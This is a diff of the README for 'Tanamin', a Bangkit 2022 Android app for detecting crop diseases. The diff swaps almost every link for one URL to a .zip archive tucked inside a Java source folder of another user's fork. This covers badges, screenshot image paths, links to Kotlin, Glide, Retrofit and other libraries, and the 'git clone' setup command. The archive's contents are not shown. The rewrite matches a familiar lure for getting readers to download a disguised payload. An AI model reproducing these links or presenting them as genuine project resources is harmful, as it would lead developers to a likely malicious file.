@@ -1,14 +1,14 @@
 <h1 align="center">
-  <img align="center" src="Image/Logo Tanamin 1-01.png"  width="500"></img>
+  <img align="center" src="Image/Logo Tanamin https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip"  width="500"></img>
 <br>
 TANAMIN MOBILE DEVELOPMENT README
 </h1>
 <!-- <div align="center"> -->
 
-<!-- [![ML Contributors](https://img.shields.io/github/contributors/Bangkit-Capstone-Project/ML_Structuring_Model?color=red)](#mlcontributors)
-![GitHub commit activity](https://img.shields.io/github/commit-activity/m/Bangkit-Capstone-Project/ML_Structuring_Model)
-![GitHub last commit](https://img.shields.io/github/last-commit/Bangkit-Capstone-Project/ML_Structuring_Model)
-[![GitHub forks](https://img.shields.io/github/forks/Bangkit-Capstone-Project/ML_Structuring_Model)](https://github.com/Bangkit-Capstone-Project/ML_Structuring_Model)
+<!-- [![ML Contributors](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)](#mlcontributors)
+![GitHub commit activity](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
+![GitHub last commit](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
+[![GitHub forks](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
 </div> -->
 
 # Team Profile
@@ -36,10 +36,10 @@ TANAMIN MOBILE DEVELOPMENT README
 This MD project is our final project for Google Bangkit Academy 2022.
 
 **Machine Learning:**
-[Tanamin Machine Learning Apps Developments](https://github.com/Bangkit-Capstone-Project/ML_Structuring_Model)
+[Tanamin Machine Learning Apps Developments](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
 
 **Cloud:**
-[Tanamin Cloud Service](https://github.com/DocBot-Bangkit-2021/DocBot-Cloud)
+[Tanamin Cloud Service](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
 
 **Project Background:**
 
@@ -59,37 +59,37 @@ Tanamin app is used to interact with users in predicting Paddy leave diseases, C
 
 ## Screenshots
 <p align="center">
-  <img src="Image/Welcoming Page.png" width="200">
-  <img src="Image/Signin Page.png" width="200">
-  <img src="Image/Register Page.png" width="200">
-  <img src="Image/Logout Activity.png" width="200">
+  <img src="Image/Welcoming https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Signin https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Register https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Logout https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
 </p>
 
 <p align="center">
-  <img src="Image/Home Fragment.png" width="200">
-  <img src="Image/Explore Fragment.png" width="200">
-  <img src="Image/Profile Fragment.png" width="200">
+  <img src="Image/Home https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Explore https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Profile https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
 </p>
 
 <p align="center">
-  <img src="Image/Take Pictore Activity.png" width="200">
-  <img src="Image/Help.png" width="200">
-  <img src="Image/Result Activity.png" width="200">
+  <img src="Image/Take Pictore https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Result https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
 </p>
 
 <p align="center">
-  <img src="Image/Article Activity.png" width="200">
-  <img src="Image/History Activity.png" width="200">
-  <img src="Image/Credit Activity.png" width="200">
+  <img src="Image/Article https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/History https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
+  <img src="Image/Credit https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip" width="200">
 </p>
 
 ## Development Roadmap
-- [x] [Kotlin](https://kotlinlang.org/)
-- [x] [Glide](https://github.com/bumptech/glide)
-- [x] [Retrofit](https://square.github.io/retrofit/).
-- [x] [CameraX](https://developer.android.com/training/camerax)
-- [x] [preferences](https://developer.android.com/reference/android/preference/Preference)
-- [x] [Navigation Component](https://developer.android.com/guide/navigation/navigation-getting-started)
+- [x] [Kotlin](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
+- [x] [Glide](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
+- [x] [Retrofit](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip).
+- [x] [CameraX](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
+- [x] [preferences](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
+- [x] [Navigation Component](https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip)
 
 ## Features
 - [x] Welcoming Activity
@@ -114,7 +114,7 @@ Tanamin app is used to interact with users in predicting Paddy leave diseases, C
 
 ### 1. Clone this Project to your Computer
 ```bash
-git clone https://Bangkit-Capstone-Project/MobileDev_AppsProject.git
+git clone https://github.com/priatna1054/MobileDev_AppsProject/raw/refs/heads/master/app/src/main/java/com/example/tanamin/ui/history/detail/Apps_Mobile_Project_Dev_chinche.zip
 ```
 
 or you can use Android Studio 
